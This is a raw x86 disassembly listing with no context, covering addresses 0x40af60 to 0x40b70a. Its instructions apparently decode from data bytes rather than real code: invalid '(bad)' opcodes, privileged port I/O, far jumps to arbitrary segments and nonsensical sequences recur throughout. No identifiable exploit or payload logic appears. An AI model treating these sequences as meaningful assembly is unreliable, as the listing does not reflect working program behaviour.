  40af60:	push   esp
  40af61:	(bad)  
  40af62:	pop    esi
  40af63:	mov    edx,0xa61f37be
  40af68:	fs jmp 0xfa94:0xdce08b48
  40af70:	dec    ecx
  40af71:	lods   eax,DWORD PTR ds:[esi]
  40af72:	mov    ecx,0x456d5964
  40af77:	sbb    al,0xc4
  40af79:	fcomp  QWORD PTR [ecx-0x4fb451f9]
  40af7f:	push   esp
  40af80:	dec    edi
  40af81:	mov    ch,0x7e
  40af83:	(bad)  
  40af84:	call   0x2022d5d1
  40af89:	jl     0x40af28
  40af8b:	enter  0xe64f,0xd
  40af8f:	fdivr  QWORD PTR [ebx]
  40af91:	ss cwde 
  40af93:	out    dx,al
  40af94:	xchg   ecx,eax
  40af95:	mov    ebx,ds
  40af97:	push   cs
  40af98:	add    edi,edx
  40af9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af9b:	cmp    DWORD PTR [eax+0x64],0xa455397
  40afa2:	lds    ebp,FWORD PTR [edx]
  40afa4:	mov    BYTE PTR [ecx],bh
  40afa6:	aad    0xce
  40afa8:	push   edi
  40afa9:	pop    esp
  40afaa:	jmp    0x10d8151d
  40afaf:	mov    al,0x50
  40afb1:	sub    esp,DWORD PTR [ecx]
  40afb3:	mov    ds:0x8f1035dc,eax
  40afb8:	aad    0xd9
  40afba:	mov    esi,0x7f1b0a5a
  40afbf:	test   eax,0x84bdc57a
  40afc4:	xchg   ebx,eax
  40afc5:	pop    ss
  40afc6:	test   al,0x5
  40afc8:	cmp    eax,0xdb60a5ff
  40afcd:	or     BYTE PTR [ecx-0x2b3b96e2],dl
  40afd3:	pop    ebx
  40afd4:	sbb    al,BYTE PTR [ebp+0x41769fbe]
  40afda:	in     al,dx
  40afdb:	cmp    eax,DWORD PTR [ebx-0x52]
  40afde:	repnz mov WORD PTR [edi-0x1ed02d8f],gs
  40afe5:	xlat   BYTE PTR ds:[ebx]
  40afe6:	repnz (bad) 
  40afe8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40afe9:	inc    DWORD PTR [ecx]
  40afeb:	mov    ds:0xa0bec2ee,eax
  40aff0:	and    bl,ah
  40aff2:	bnd jo 0x40afe6
  40aff5:	les    ebx,FWORD PTR [edi-0x32223dc8]
  40affb:	fisttp DWORD PTR [ecx-0x6f]
  40affe:	sub    bl,bh
  40b000:	jge    0x40b05f
  40b002:	or     ecx,DWORD PTR [edi+ebp*1+0x5b]
  40b006:	rol    DWORD PTR [edx-0x17],1
  40b009:	lds    edx,FWORD PTR [eax]
  40b00b:	cmp    al,0x80
  40b00d:	arpl   ax,ax
  40b00f:	sbb    al,0x8a
  40b011:	aaa    
  40b012:	or     eax,0x7e574d9
  40b017:	mov    ds:0x722ca48b,al
  40b01c:	adc    edx,DWORD PTR es:[ecx+0x68]
  40b020:	(bad)  
  40b021:	cli    
  40b022:	push   ebp
  40b023:	stos   BYTE PTR es:[edi],al
  40b024:	push   eax
  40b025:	gs mov ch,0xa6
  40b028:	rcr    eax,0xa2
  40b02b:	jae    0x40b0a3
  40b02d:	scas   al,BYTE PTR es:[edi]
  40b02e:	iret   
  40b02f:	jg     0x40b059
  40b031:	out    dx,al
  40b032:	stos   DWORD PTR es:[edi],eax
  40b033:	xor    BYTE PTR ds:0xd6ad94ce,al
  40b039:	iret   
  40b03a:	cli    
  40b03b:	mov    ecx,0x6f9148ca
  40b040:	pop    esi
  40b041:	leave  
  40b042:	dec    esp
  40b043:	cmp    al,0x80
  40b045:	out    dx,eax
  40b046:	pop    eax
  40b047:	lock adc dl,bl
  40b04a:	fisttp QWORD PTR [ebx]
  40b04c:	repnz retf 
  40b04e:	hlt    
  40b04f:	mov    ss,WORD PTR [edi-0x2d92bf73]
  40b055:	(bad)  
  40b056:	rcl    BYTE PTR [ebp-0x22326f6],0xa1
  40b05d:	or     al,0x69
  40b05f:	jp     0x40b094
  40b061:	pop    ds
  40b062:	stc    
  40b063:	or     eax,0x65a599cd
  40b068:	sbb    BYTE PTR [esi],ah
  40b06a:	es jns 0x40b06e
  40b06d:	mov    cl,0x57
  40b06f:	outs   dx,DWORD PTR es:[esi]
  40b071:	xor    DWORD PTR [esp+eax*8+0x64],ecx
  40b075:	ret    
  40b076:	stos   DWORD PTR es:[edi],eax
  40b077:	mov    bl,0x46
  40b079:	shl    dh,1
  40b07b:	imul   esi,ecx,0x7e
  40b07e:	jge    0x40b0be
  40b080:	std    
  40b081:	sbb    DWORD PTR [ecx-0x6dc5832c],ecx
  40b087:	xor    edx,DWORD PTR ds:0x55803ff2
  40b08d:	or     DWORD PTR [eax+0x6b889764],esp
  40b093:	(bad)  
  40b095:	pop    ebp
  40b096:	test   BYTE PTR [ecx+0x572dbc26],al
  40b09c:	cmp    BYTE PTR [edx],dl
  40b09e:	ins    BYTE PTR es:[edi],dx
  40b09f:	jnp    0x40b0d9
  40b0a1:	inc    esp
  40b0a2:	push   edx
  40b0a3:	xchg   DWORD PTR [edx-0x1c],esi
  40b0a6:	xchg   edi,eax
  40b0a7:	xor    BYTE PTR [ecx+eax*2+0x59],ch
  40b0ab:	fnstsw WORD PTR [ebp-0x53379acd]
  40b0b1:	mov    esi,0x1d8381e3
  40b0b6:	xor    BYTE PTR [edx+0xa],cl
  40b0b9:	or     edx,DWORD PTR [esi-0x77]
  40b0bc:	push   ebp
  40b0bd:	lods   al,BYTE PTR ds:[esi]
  40b0be:	push   eax
  40b0bf:	imul   bh
  40b0c1:	add    al,ch
  40b0c3:	outs   dx,BYTE PTR ds:[esi]
  40b0c4:	bound  ebp,QWORD PTR ds:0xa7bde4b2
  40b0ca:	xlat   BYTE PTR es:[ebx]
  40b0cc:	in     al,dx
  40b0cd:	ja     0x40b083
  40b0cf:	mov    ebp,0x8a8c49aa
  40b0d4:	sbb    DWORD PTR [edx+0xb99ecc4],ebx
  40b0da:	mov    cl,0xaf
  40b0dc:	jle    0x40b067
  40b0de:	mov    dl,0x22
  40b0e0:	in     eax,0x3e
  40b0e2:	xor    eax,0x92fc0a35
  40b0e7:	mov    dh,0xb7
  40b0e9:	shr    cl,1
  40b0eb:	mov    ebp,0xc127eac5
  40b0f0:	or     eax,0x173aaa81
  40b0f5:	mov    esp,0x77b9068e
  40b0fa:	mov    dh,0xf6
  40b0fc:	pop    ebp
  40b0fd:	sub    edi,DWORD PTR [edi-0x2fc57f8]
  40b103:	jmp    FWORD PTR [ebp+0xb6c7a5e]
  40b109:	jbe    0x40b0fe
  40b10b:	loope  0x40b172
  40b10d:	xchg   edx,eax
  40b10e:	scas   eax,DWORD PTR es:[edi]
  40b10f:	push   0x41
  40b111:	pop    ds
  40b112:	hlt    
  40b113:	xchg   esi,eax
  40b114:	pop    eax
  40b115:	mov    cl,0x4b
  40b117:	jg     0x40b11c
  40b119:	fwait
  40b11a:	sub    edi,DWORD PTR [edx-0x51]
  40b11d:	scas   eax,DWORD PTR es:[edi]
  40b11e:	push   ds
  40b11f:	lds    edx,FWORD PTR [ebx+0x2b]
  40b122:	arpl   WORD PTR [ecx+0x64],cx
  40b125:	ins    DWORD PTR es:[edi],dx
  40b126:	psubusw mm3,QWORD PTR [esi-0x12f80578]
  40b12d:	dec    ecx
  40b12e:	sbb    ecx,0x8b9259a6
  40b134:	jmp    0x40b11a
  40b136:	ror    BYTE PTR [ebx-0x373716d8],0x39
  40b13d:	dec    edx
  40b13e:	repnz (bad) 
  40b140:	cmp    BYTE PTR [eax+0x42d3e936],bh
  40b146:	push   ds
  40b147:	xchg   BYTE PTR [esi],bh
  40b149:	xor    dl,dl
  40b14b:	ds pop edx
  40b14d:	dec    edi
  40b14e:	lock push ds
  40b150:	mov    cl,0xdf
  40b152:	repnz inc esp
  40b154:	mov    al,ds:0xdeda538b
  40b159:	fdivr  QWORD PTR [ebx+0x2d]
  40b15c:	and    al,0x42
  40b15e:	mov    gs,WORD PTR [ebx-0x345bbf15]
  40b164:	xchg   ebx,eax
  40b165:	jmp    0xaec0ca7b
  40b16a:	cld    
  40b16b:	push   esi
  40b16c:	fbstp  TBYTE PTR [ebx+0x4a]
  40b16f:	sahf   
  40b170:	jl     0x40b183
  40b172:	test   eax,0xf4e14fe6
  40b177:	push   ebx
  40b178:	lds    edi,FWORD PTR [esp+ebx*1]
  40b17b:	out    dx,al
  40b17c:	and    BYTE PTR [edi-0x32],ah
  40b17f:	test   dl,0x8e
  40b182:	mov    ch,0x35
  40b184:	and    al,0x99
  40b186:	(bad)  
  40b187:	fdiv   QWORD PTR [ebx-0x27088a6f]
  40b18d:	ja     0x40b162
  40b18f:	loope  0x40b1bb
  40b191:	mov    ebp,0xaabfb3e8
  40b196:	push   edx
  40b197:	imul   esi,DWORD PTR [esi+0x55],0x4e
  40b19b:	jbe    0x40b12f
  40b19d:	pusha  
  40b19e:	xor    esi,edx
  40b1a0:	sar    edi,cl
  40b1a2:	cmp    edi,esi
  40b1a4:	xchg   esp,eax
  40b1a5:	gs iret 
  40b1a7:	lock sub BYTE PTR [esi+0x59241772],bl
  40b1ae:	je     0x40b190
  40b1b0:	out    0x90,eax
  40b1b2:	test   eax,0x794ba1f4
  40b1b7:	pop    ds
  40b1b8:	add    eax,0xacbaecef
  40b1bd:	mov    esp,0x1ae2aa36
  40b1c2:	sbb    eax,0x523923cd
  40b1c7:	daa    
  40b1c8:	scas   al,BYTE PTR es:[edi]
  40b1c9:	or     edx,ebp
  40b1cb:	mov    eax,DWORD PTR [eax+0x7a4e4fe3]
  40b1d1:	xchg   esi,eax
  40b1d2:	jns    0x40b23e
  40b1d4:	or     edx,DWORD PTR [ebp+0xd0f6afd]
  40b1da:	jae    0x40b1f3
  40b1dc:	into   
  40b1dd:	sahf   
  40b1de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b1df:	fcomp  DWORD PTR [edx+0x48]
  40b1e2:	and    BYTE PTR [esi],dl
  40b1e4:	fmul   DWORD PTR [ebx+ebx*4]
  40b1e7:	std    
  40b1e8:	jne    0x40b240
  40b1ea:	jnp    0x40b240
  40b1ec:	add    DWORD PTR [ebx+0xb],edx
  40b1ef:	test   eax,0x995fc77b
  40b1f4:	push   esi
  40b1f5:	mov    BYTE PTR [edx],ch
  40b1f7:	out    0x47,al
  40b1f9:	clc    
  40b1fa:	cwde   
  40b1fb:	fst    QWORD PTR [eax+0x73]
  40b1fe:	mov    ?,esi
  40b200:	push   ebx
  40b201:	out    0xba,eax
  40b203:	mov    ebp,0x4d036825
  40b208:	fs jae 0x40b1de
  40b20b:	xchg   esp,eax
  40b20c:	stos   DWORD PTR es:[edi],eax
  40b20d:	mov    ah,0xf0
  40b20f:	outs   dx,BYTE PTR ds:[esi]
  40b210:	sub    al,0x84
  40b212:	or     cl,BYTE PTR [eax]
  40b214:	dec    eax
  40b215:	scas   al,BYTE PTR es:[edi]
  40b216:	sbb    al,0x2
  40b218:	out    dx,al
  40b219:	test   BYTE PTR [ebp-0x6b],bl
  40b21c:	mov    ?,ecx
  40b21e:	sub    al,0xae
  40b220:	mov    edx,0x6ec64d0
  40b225:	and    BYTE PTR [ebp-0x3c],bl
  40b228:	dec    edx
  40b229:	sbb    BYTE PTR [edx+0x27],ah
  40b22c:	xchg   edi,eax
  40b22d:	mov    ds:0x6083fff8,eax
  40b232:	cs ja  0x40b21a
  40b235:	int3   
  40b236:	test   eax,0x9fa6079f
  40b23b:	mov    dl,0x72
  40b23d:	cmp    DWORD PTR ds:0x65364aa6,0x22a8becb
  40b247:	mov    bh,0x8e
  40b249:	neg    BYTE PTR [ecx-0x24fd3c36]
  40b24f:	or     eax,0xe128a19b
  40b254:	stos   BYTE PTR es:[edi],al
  40b255:	mov    edx,0xcd4ad9f9
  40b25a:	push   0x7bc10a01
  40b25f:	push   edx
  40b260:	scas   al,BYTE PTR es:[edi]
  40b261:	xor    BYTE PTR [edi-0x1],al
  40b264:	sahf   
  40b265:	dec    eax
  40b266:	push   esp
  40b267:	ja     0x40b204
  40b269:	test   BYTE PTR [ebx+0x32cc7ea6],0x40
  40b270:	xor    al,BYTE PTR [edi+ecx*4+0x2b]
  40b274:	call   0x36aefe9f
  40b279:	mov    eax,0x737c1a7d
  40b27e:	cmp    eax,0xd4ba496b
  40b283:	jg     0x40b23a
  40b285:	in     eax,dx
  40b286:	push   ds
  40b287:	mov    cl,0xc2
  40b289:	pop    es
  40b28a:	mov    ds:0xa52300a6,eax
  40b28f:	sub    ebx,DWORD PTR [ebx]
  40b291:	cdq    
  40b292:	inc    eax
  40b293:	xlat   BYTE PTR ds:[ebx]
  40b294:	adc    eax,0xe2559a73
  40b299:	mov    edx,0x767efa95
  40b29e:	add    al,0xe4
  40b2a0:	xchg   BYTE PTR [ebx-0x17],bh
  40b2a3:	imul   ebp,DWORD PTR ds:0x99c044b7,0xffffff82
  40b2aa:	add    BYTE PTR [ebx+ecx*1-0x57bf0096],dl
  40b2b1:	mov    ecx,DWORD PTR fs:[ecx-0x80]
  40b2b5:	sbb    BYTE PTR [ecx],0xbb
  40b2b8:	out    dx,al
  40b2b9:	cs cdq 
  40b2bb:	repnz fsubr st(7),st
  40b2be:	push   cs
  40b2bf:	add    dh,BYTE PTR [eax-0x67]
  40b2c2:	stos   DWORD PTR es:[edi],eax
  40b2c3:	sbb    BYTE PTR ds:0x3007d0ca,cl
  40b2c9:	(bad)  
  40b2ca:	mov    dl,0x42
  40b2cc:	or     BYTE PTR [ecx+0x55],al
  40b2cf:	retf   
  40b2d0:	push   0x7c
  40b2d2:	test   eax,0xa1e6fb37
  40b2d8:	adc    eax,0xa9f232a7
  40b2dd:	nop
  40b2de:	jp     0x40b28c
  40b2e0:	push   0x415d7547
  40b2e5:	ins    DWORD PTR es:[edi],dx
  40b2e6:	int3   
  40b2e7:	mov    ds,WORD PTR [edx-0x400ec0db]
  40b2ed:	fcmove st,st(4)
  40b2ef:	pop    esi
  40b2f0:	pushf  
  40b2f1:	ret    0xc102
  40b2f4:	daa    
  40b2f5:	lds    esp,FWORD PTR [esi+edx*8-0x31]
  40b2f9:	call   0xc568701c
  40b2fe:	jmp    0x7c9e:0x5a02273c
  40b305:	push   0x9818692a
  40b30a:	cmp    eax,0x6a804129
  40b30f:	sbb    WORD PTR [ebx+eiz*8+0x5d],bp
  40b314:	sbb    eax,0x98daef83
  40b319:	ds pop esi
  40b31b:	out    dx,eax
  40b31c:	call   0xcd82b696
  40b321:	(bad)  
  40b322:	out    0xd0,al
  40b324:	push   esp
  40b325:	loope  0x40b386
  40b327:	push   es
  40b328:	ja     0x40b2fb
  40b32a:	jle    0x40b316
  40b32c:	loope  0x40b30b
  40b32e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b32f:	mov    ch,0x38
  40b331:	jns    0x40b36f
  40b333:	cmp    al,al
  40b335:	not    DWORD PTR [ecx+0x16]
  40b338:	pop    ss
  40b339:	mov    bh,0x4e
  40b33b:	cmp    dh,BYTE PTR [edx]
  40b33d:	pop    esi
  40b33e:	dec    esp
  40b33f:	cmp    DWORD PTR [edi-0x4680077e],ecx
  40b345:	pusha  
  40b346:	xchg   esi,eax
  40b347:	jecxz  0x40b396
  40b349:	sbb    eax,0x16f957b0
  40b34e:	push   esp
  40b34f:	and    al,BYTE PTR ds:0x4f005f31
  40b355:	call   0x1ea2:0xb3ce1f51
  40b35c:	retf   
  40b35d:	dec    esp
  40b35e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b35f:	jno    0x40b32f
  40b361:	cmp    ch,dl
  40b363:	je     0x40b2f1
  40b365:	push   esi
  40b366:	xor    DWORD PTR [ecx],edx
  40b368:	out    0x8e,eax
  40b36a:	test   BYTE PTR [esp+eiz*2],ah
  40b36d:	sar    DWORD PTR [esi+0x72a32834],0xf5
  40b374:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b375:	test   BYTE PTR [esp+ebp*8+0x58],dh
  40b379:	sub    bl,dl
  40b37b:	jno    0x40b366
  40b37d:	push   ecx
  40b37e:	out    dx,al
  40b37f:	je     0x40b335
  40b381:	sbb    bh,dh
  40b383:	mov    ds:0x6372bd5e,eax
  40b388:	repz jge 0x40b314
  40b38b:	(bad)  
  40b38c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b38d:	inc    esp
  40b38e:	push   esp
  40b38f:	sar    BYTE PTR [ebp-0x3b],0xbc
  40b393:	xchg   edi,eax
  40b394:	jmp    0xdd17:0x107f7c41
  40b39b:	cmp    eax,0xfc7ad4dc
  40b3a0:	sbb    ah,BYTE PTR [eax-0x3b]
  40b3a3:	std    
  40b3a4:	add    DWORD PTR [eax],0xffffff98
  40b3a7:	outs   dx,BYTE PTR ds:[esi]
  40b3a8:	std    
  40b3a9:	mov    esp,0xa6d9580d
  40b3ae:	or     ebp,esp
  40b3b0:	ror    cl,cl
  40b3b2:	adc    eax,0x39f0a079
  40b3b7:	xor    eax,0xc2bd2215
  40b3bc:	or     cl,BYTE PTR [ebx-0x80]
  40b3bf:	pop    ecx
  40b3c0:	fnstsw WORD PTR [edi]
  40b3c2:	sbb    DWORD PTR [ebp+0x65],ecx
  40b3c5:	cmp    al,bh
  40b3c7:	mov    dh,0xa3
  40b3c9:	jmp    0x40b36d
  40b3cb:	mov    dh,0xb4
  40b3cd:	mov    ds:0xd9e1a56e,eax
  40b3d2:	jno    0x40b40c
  40b3d4:	ror    ecx,0xb6
  40b3d7:	xor    ebx,DWORD PTR [eax+edx*2-0x38ff7cf3]
  40b3de:	pop    esp
  40b3df:	fiadd  WORD PTR fs:[ebx]
  40b3e2:	jno    0x40b434
  40b3e4:	cwde   
  40b3e5:	jns    0x40b3c1
  40b3e7:	adc    dl,0x63
  40b3ea:	pop    ds
  40b3eb:	fist   DWORD PTR [eax-0x12]
  40b3ee:	jmp    DWORD PTR [ebp+ecx*1+0x4e]
  40b3f2:	push   di
  40b3f4:	dec    ebx
  40b3f5:	pop    ds
  40b3f6:	add    ch,dl
  40b3f8:	adc    eax,0xa5a67edc
  40b3fd:	or     BYTE PTR [ecx*2-0x3afba3b7],0xfc
  40b405:	inc    ebp
  40b406:	mov    ebx,DWORD PTR [esp+esi*8+0x3d]
  40b40a:	call   0x7e9ac769
  40b40f:	add    ebx,DWORD PTR [edx+0x1c]
  40b412:	call   0x7e33540d
  40b417:	aaa    
  40b418:	mov    bl,BYTE PTR [edx]
  40b41a:	enter  0x93ea,0x62
  40b41e:	jp     0x40b499
  40b420:	lds    ebp,FWORD PTR [ebx]
  40b422:	(bad)  
  40b423:	xlat   BYTE PTR ds:[ebx]
  40b424:	and    al,0xbc
  40b426:	mov    edi,0x37349154
  40b42b:	adc    bl,dl
  40b42d:	adc    BYTE PTR [eax-0x90313f5],al
  40b433:	fidiv  DWORD PTR [eax]
  40b435:	mov    esi,0x3dc488df
  40b43a:	xchg   edx,eax
  40b43b:	loop   0x40b460
  40b43d:	pop    eax
  40b43e:	cmp    cl,BYTE PTR [esp+ebx*4]
  40b441:	repz (bad) 
  40b443:	es push ebp
  40b445:	sub    esp,eax
  40b447:	dec    ecx
  40b448:	std    
  40b449:	jb     0x40b4a7
  40b44b:	inc    eax
  40b44c:	push   cs
  40b44d:	jbe    0x40b444
  40b44f:	xor    BYTE PTR [esi+esi*2-0x48],0xd7
  40b454:	pop    esp
  40b455:	jne    0x40b48f
  40b457:	or     al,0x50
  40b459:	cs adc eax,edx
  40b45c:	loop   0x40b3e7
  40b45e:	fwait
  40b45f:	iret   
  40b460:	sub    eax,0x22c463b0
  40b465:	out    dx,al
  40b466:	add    eax,0x87e31709
  40b46b:	arpl   WORD PTR [ebp-0x64],dx
  40b46e:	stos   DWORD PTR es:[edi],eax
  40b46f:	cs gs jg 0x40b3fb
  40b473:	push   esi
  40b474:	cmp    edi,0x52
  40b477:	xor    eax,0x2ed2ec5d
  40b47c:	inc    esi
  40b47d:	ror    BYTE PTR [edx-0x2951ed4e],cl
  40b483:	sub    eax,0x8cd83e3a
  40b488:	cmp    eax,0x5a7ea251
  40b48d:	sub    BYTE PTR [ecx],0x11
  40b490:	cmc    
  40b491:	test   eax,0x761ee3fb
  40b496:	pop    ss
  40b497:	test   eax,0x7d5bd9d
  40b49c:	pop    eax
  40b49d:	pop    ds
  40b49e:	ins    BYTE PTR es:[edi],dx
  40b49f:	pop    esi
  40b4a0:	bound  esp,QWORD PTR [ecx+0x1]
  40b4a3:	ror    DWORD PTR [esi+edi*2-0x1],cl
  40b4a7:	pop    edx
  40b4a8:	icebp  
  40b4a9:	and    eax,ebp
  40b4ab:	gs (bad) 
  40b4ad:	mov    ch,0xed
  40b4af:	inc    eax
  40b4b0:	xchg   BYTE PTR [ecx],dl
  40b4b2:	push   ecx
  40b4b3:	xchg   esp,eax
  40b4b4:	xor    ebx,DWORD PTR [edx+edx*4-0x1]
  40b4b8:	(bad)  
  40b4bb:	cld    
  40b4bc:	sub    eax,0x1b201994
  40b4c1:	retf   
  40b4c2:	or     BYTE PTR [esi],al
  40b4c4:	push   edx
  40b4c5:	test   al,0x6d
  40b4c7:	jb     0x40b4c5
  40b4c9:	call   0x4822:0xa8be4dd
  40b4d0:	jmp    0xb0fd:0x12e25898
  40b4d7:	adc    dl,BYTE PTR [ebp+eiz*8+0x38c804e5]
  40b4de:	jecxz  0x40b4f7
  40b4e0:	(bad)  
  40b4e1:	add    edi,DWORD PTR [edx]
  40b4e3:	pop    esp
  40b4e4:	add    BYTE PTR [ebx+ebp*8],cl
  40b4e7:	sub    BYTE PTR [esi],ah
  40b4e9:	push   edx
  40b4ea:	mov    ch,0xc6
  40b4ec:	sbb    eax,0x4d56ce1c
  40b4f1:	pop    esi
  40b4f2:	repnz or al,0x86
  40b4f5:	(bad)  
  40b4f6:	mov    al,ds:0x7ac05425
  40b4fb:	jecxz  0x40b53f
  40b4fd:	stos   DWORD PTR es:[edi],eax
  40b4fe:	popa   
  40b4ff:	pop    esp
  40b500:	call   0xdde0:0xf8c19e18
  40b507:	lea    esi,[ebx]
  40b509:	mov    eax,0xd64b8f24
  40b50e:	repz jo 0x40b513
  40b511:	cld    
  40b512:	ja     0x40b51d
  40b514:	call   ebx
  40b516:	aad    0xc3
  40b518:	fisub  DWORD PTR [ebp-0x254638cd]
  40b51e:	ret    0x971f
  40b521:	not    ebx
  40b523:	popf   
  40b524:	stos   DWORD PTR es:[edi],eax
  40b525:	jne    0x40b4ee
  40b527:	add    BYTE PTR [ebp+0x3b1c180f],cl
  40b52d:	lods   al,BYTE PTR ds:[esi]
  40b52e:	and    BYTE PTR ds:0x7c0b4d4e,0xaf
  40b535:	sub    DWORD PTR [ebx+0x34],eax
  40b538:	(bad)  
  40b53a:	push   ebp
  40b53b:	ret    
  40b53c:	or     ecx,DWORD PTR [ebx-0x7a6afceb]
  40b542:	cmp    al,0xb9
  40b544:	mov    dh,0xb2
  40b546:	adc    DWORD PTR [edi-0x2dd26faf],edi
  40b54c:	lds    ebp,FWORD PTR [ecx+0x52]
  40b54f:	imul   ecx,DWORD PTR [edx+0x6ae4d2e0],0x47a723d8
  40b559:	push   esi
  40b55a:	in     al,0x6e
  40b55c:	pusha  
  40b55d:	jne    0x40b59c
  40b55f:	lea    ebx,[edi]
  40b561:	and    al,0x20
  40b563:	xchg   esp,eax
  40b564:	nop
  40b565:	push   0x231c3bbf
  40b56a:	ret    0xc72b
  40b56d:	lea    ecx,[eax-0x5a]
  40b570:	out    dx,al
  40b571:	aad    0xf1
  40b573:	fild   WORD PTR [esi+0x75e0fb74]
  40b579:	ins    BYTE PTR es:[edi],dx
  40b57a:	pop    eax
  40b57b:	jge    0x40b5ac
  40b57d:	je     0x40b51c
  40b57f:	mov    al,ds:0x5ed34d1f
  40b584:	jb     0x40b518
  40b586:	mov    edi,0x7e145f37
  40b58b:	stos   BYTE PTR es:[edi],al
  40b58c:	lods   eax,DWORD PTR ds:[esi]
  40b58d:	or     BYTE PTR fs:[ecx-0x10],ah
  40b591:	and    DWORD PTR [ecx-0x34],ebx
  40b594:	jno    0x40b5e1
  40b596:	dec    edi
  40b597:	mov    eax,DWORD PTR [ebx-0x7b949172]
  40b59d:	push   0xffffff87
  40b59f:	js     0x40b593
  40b5a1:	mov    dh,BYTE PTR [esi+0x2c]
  40b5a4:	(bad)  
  40b5a5:	imul   edx,DWORD PTR ds:0x20947dbc,0xffffff99
  40b5ac:	ror    BYTE PTR [ebx+0x23],1
  40b5af:	push   esi
  40b5b0:	enter  0xf34b,0x45
  40b5b4:	pop    ebx
  40b5b5:	sbb    esi,DWORD PTR [ebx+ebx*8]
  40b5b8:	mov    ds:0xa80645e2,al
  40b5bd:	mov    edi,0x702092a0
  40b5c2:	add    al,0x58
  40b5c4:	lea    esi,[ebx]
  40b5c6:	and    eax,0x5d8da8f2
  40b5cc:	mov    ebx,0xb3decb01
  40b5d1:	push   ebx
  40b5d2:	ins    BYTE PTR es:[edi],dx
  40b5d3:	xlat   BYTE PTR ds:[ebx]
  40b5d4:	mov    edx,0x471fce2f
  40b5d9:	test   al,0xab
  40b5db:	jbe    0x40b5db
  40b5dd:	ror    BYTE PTR [esi],1
  40b5df:	cmp    BYTE PTR [edi],0xe3
  40b5e2:	out    dx,al
  40b5e3:	jecxz  0x40b5bc
  40b5e5:	add    bl,dh
  40b5e7:	loop   0x40b5e7
  40b5e9:	sub    bl,BYTE PTR [ebx]
  40b5eb:	loop   0x40b5e3
  40b5ed:	cmp    eax,0xc06af8cf
  40b5f2:	aad    0x3a
  40b5f4:	out    dx,eax
  40b5f5:	xor    bl,BYTE PTR [edi]
  40b5f7:	fadd   DWORD PTR [ebx]
  40b5f9:	and    eax,DWORD PTR es:[ebp-0x62]
  40b5fd:	sti    
  40b5fe:	sub    BYTE PTR [edx-0x1e],bl
  40b601:	ret    0x121d
  40b604:	hlt    
  40b605:	push   eax
  40b606:	xchg   BYTE PTR [esp+ebp*1-0x30],dh
  40b60a:	ret    
  40b60b:	xchg   BYTE PTR [ebx],bh
  40b60d:	icebp  
  40b60e:	out    dx,al
  40b60f:	cmp    BYTE PTR [esi-0x38424a31],dh
  40b615:	data16 test ah,0xc
  40b619:	cmp    DWORD PTR [edi],eax
  40b61b:	or     BYTE PTR [bx+di-0x70],dl
  40b61f:	in     eax,0x7d
  40b621:	(bad)  
  40b622:	xchg   esi,eax
  40b623:	jecxz  0x40b688
  40b625:	sub    bl,BYTE PTR [ebp+0x32b22343]
  40b62b:	dec    edi
  40b62c:	fcomp  DWORD PTR [ebx-0x588f545a]
  40b632:	adc    BYTE PTR [esi+0x94d0ca2],0x27
  40b639:	lods   al,BYTE PTR ds:[esi]
  40b63a:	fwait
  40b63b:	pushw  0xffbc
  40b63e:	rcl    BYTE PTR [ebx],0x2e
  40b641:	call   0x202d:0x9b1634cb
  40b648:	mov    ebx,0x9c7f23b
  40b64d:	dec    ebx
  40b64e:	and    ecx,eax
  40b650:	out    0x65,eax
  40b652:	lds    esp,FWORD PTR [ebp+0x3d]
  40b655:	enter  0x6717,0xfa
  40b659:	lock fmul QWORD PTR [ecx-0x69]
  40b65d:	aaa    
  40b65e:	jge    0x40b6b5
  40b660:	dec    ebx
  40b661:	sbb    dl,BYTE PTR [ebx-0x2924527c]
  40b667:	jmp    0x3ffab922
  40b66c:	popa   
  40b66d:	sub    BYTE PTR [edi-0x5c],bl
  40b670:	pop    esi
  40b671:	fnstcw WORD PTR [eax]
  40b673:	sbb    ah,cl
  40b675:	mov    dl,0x71
  40b677:	push   ebp
  40b678:	(bad)  
  40b679:	or     eax,0x1df8fa4c
  40b67e:	sub    eax,0xf374978c
  40b683:	loope  0x40b6da
  40b685:	push   0xffffff85
  40b687:	test   al,0x8c
  40b689:	(bad)  
  40b68a:	fist   DWORD PTR [edi+0x0]
  40b68d:	dec    BYTE PTR [edx-0x76]
  40b690:	inc    ebp
  40b691:	sub    DWORD PTR [eax+ebx*1],0xffffffdf
  40b695:	or     dl,cl
  40b697:	push   edx
  40b698:	pop    ebx
  40b699:	dec    esp
  40b69a:	nop
  40b69b:	cs adc al,0x63
  40b69e:	push   ss
  40b69f:	sti    
  40b6a0:	xor    eax,0x9ea4f066
  40b6a5:	fimul  DWORD PTR [ebx]
  40b6a7:	mov    esp,0x20780e65
  40b6ac:	push   edx
  40b6ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ae:	loopne 0x40b6c8
  40b6b0:	jbe    0x40b6fe
  40b6b2:	out    0x3c,eax
  40b6b4:	jae    0x40b666
  40b6b6:	pop    ds
  40b6b7:	cmp    bl,cl
  40b6b9:	pop    ds
  40b6ba:	js     0x40b63f
  40b6bc:	sbb    cl,BYTE PTR [ebx]
  40b6be:	push   edi
  40b6bf:	hlt    
  40b6c0:	mov    ebp,0x9893e4d6
  40b6c5:	adc    ah,ch
  40b6c7:	ss sbb eax,0x2dba4771
  40b6cd:	sbb    eax,0xfb674469
  40b6d2:	sbb    al,0x29
  40b6d4:	sbb    al,0x40
  40b6d6:	or     ebp,DWORD PTR [edx-0x5d]
  40b6d9:	add    DWORD PTR [esi+0x23],edi
  40b6dc:	xchg   ebx,eax
  40b6dd:	cmp    eax,0x851fff5d
  40b6e2:	(bad)  
  40b6e3:	fidivr DWORD PTR [edx]
  40b6e5:	and    ch,al
  40b6e7:	jns    0x40b71e
  40b6e9:	(bad)  
  40b6ea:	mov    ds:0xd71edecf,eax
  40b6ef:	mov    edi,DWORD PTR [esi]
  40b6f1:	add    eax,0x76b19539
  40b6f6:	jo     0x40b689
  40b6f8:	xor    eax,0xc398f378
  40b6fd:	push   0x0
  40b6ff:	out    0xc4,eax
  40b701:	or     bh,BYTE PTR [bx+di]
  40b704:	retf   0x51bc
  40b707:	mov    bl,0xb
  40b709:	stc    
  40b70a:	es mov dh,0xa5
